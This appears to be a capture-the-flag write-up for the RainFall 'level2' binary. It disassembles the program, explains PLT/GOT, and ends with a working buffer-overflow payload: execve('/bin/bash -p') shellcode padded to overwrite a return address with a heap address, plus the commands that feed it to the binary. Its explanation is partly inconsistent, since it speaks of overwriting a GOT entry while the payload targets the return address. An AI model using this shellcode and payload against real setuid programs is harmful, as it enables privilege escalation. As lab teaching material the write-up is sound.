##  Description

This level greets us with a similar setup as the previous one if we look at the binary:

```bash
level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble main'
Dump of assembler code for function main:
   0x0804853f <+0>:	    push   %ebp
   0x08048540 <+1>:	    mov    %esp,%ebp
   0x08048542 <+3>:	    and    $0xfffffff0,%esp
   0x08048545 <+6>:	    call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

Let's look at that function `p`:

```bash
level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble p'
Dump of assembler code for function p:
   0x080484d4 <+0>:	    push   %ebp
   0x080484d5 <+1>:	    mov    %esp,%ebp
   0x080484d7 <+3>:	    sub    $0x68,%esp
   0x080484da <+6>:	    mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

While the function still calls `gets`, the `system` call is no longer present in the binary:

```
level2@RainFall:~$ objdump -d level2 | grep '@plt'
08048410 <__libc_start_main@plt>:
 804843c:	e8 cf ff ff ff       	call   8048410 <__libc_start_main@plt>
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
```

##  PLT vs. GOT

Before we continue, we need to explain what the Procedure Linkage Table (PLT) and Global Offset Table (GOT) are.

When a binary is compiled and linked, function calls to shared libraries (like `libc`) are not resolved at compile time. Instead, they are resolved at runtime. The PLT is a section in the binary that contains stubs for these function calls. When a function is called for the first time, the PLT entry for that function will jump to the dynamic linker, which will then resolve the actual address of the function in memory and update the GOT with this address. Subsequent calls to the same function will then use the address stored in the GOT.

In simpler terms, the PLT is like a table of contents that keeps every function call saved under an alias, while the GOT acts as a cache, or a relay station that points to the actual location of these functions in memory.

If we can overwrite an entry in the GOT, we can redirect function calls to any address we want: if you know about MITM attacks, this is a very similar approach in the sense that we are trying to 'poison' the GOT cache to redirect function calls, just like a MITM attack poisons the ARP table to redirect network traffic to a different destination.

##  Exploiting the binary

Here the level gives us subtle hints as to how to proceed. The presence of the `gets` function indicates that we can overflow a buffer, but the absence of `system` suggests we need to call the shell ourselves. The check for the high bits of the input address (the `and` and `cmp` instructions) indicates that we cannot return to the stack or the libc, since the high ranges `0xb7xxxxxx` and `0xbfxxxxxx` are filtered out. The presence of `strdup` is hints at a possible use the heap to store our shellcode, aka the CPU instructions that will spawn our shell.

Since the address range for the heap, the lower addresses, is not filtered out, we can inject our shellcode into the heap and then overwrite a GOT entry to point to this shellcode. When the function corresponding to the overwritten GOT entry is called, it will execute our shellcode instead.

Consider the following instructions:

```bash
python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
```

```assembler
6a 0b           push 0xb          ; syscall 11 = execve
58              pop eax           ; eax = 11
99              cdq               ; edx = 0
52              push edx          ; NULL terminator
66 68 2d 70     push word 0x702d  ; "-p"
89 e1           mov ecx, esp      ; ecx pointe vers "-p"
52              push edx          ; NULL
6a 68           push byte 0x68    ; "h"
68 2f 62 61 73  push 0x7361622f   ; "/bas"
68 2f 62 69 6e  push 0x6e69622f   ; "/bin"
89 e3           mov ebx, esp      ; ebx pointe vers "/bin/bash"
52              push edx          ; argv[2] = NULL
51              push ecx          ; argv[1] = "-p"
53              push ebx          ; argv[0] = "/bin/bash"
89 e1           mov ecx, esp      ; ecx = argv
cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
```

We then need to inject this shellcode like so:

```bash
level2@RainFall:~$ cat /tmp/payload - | ./level2
```

Note the `-` after the payload file, this tells `cat` to read from standard input after reading the file, allowing us to append more data to the payload. This is effectively the same as doing:

```bash
level2@RainFall:~$ (cat /tmp/payload ; cat) | ./level2
```
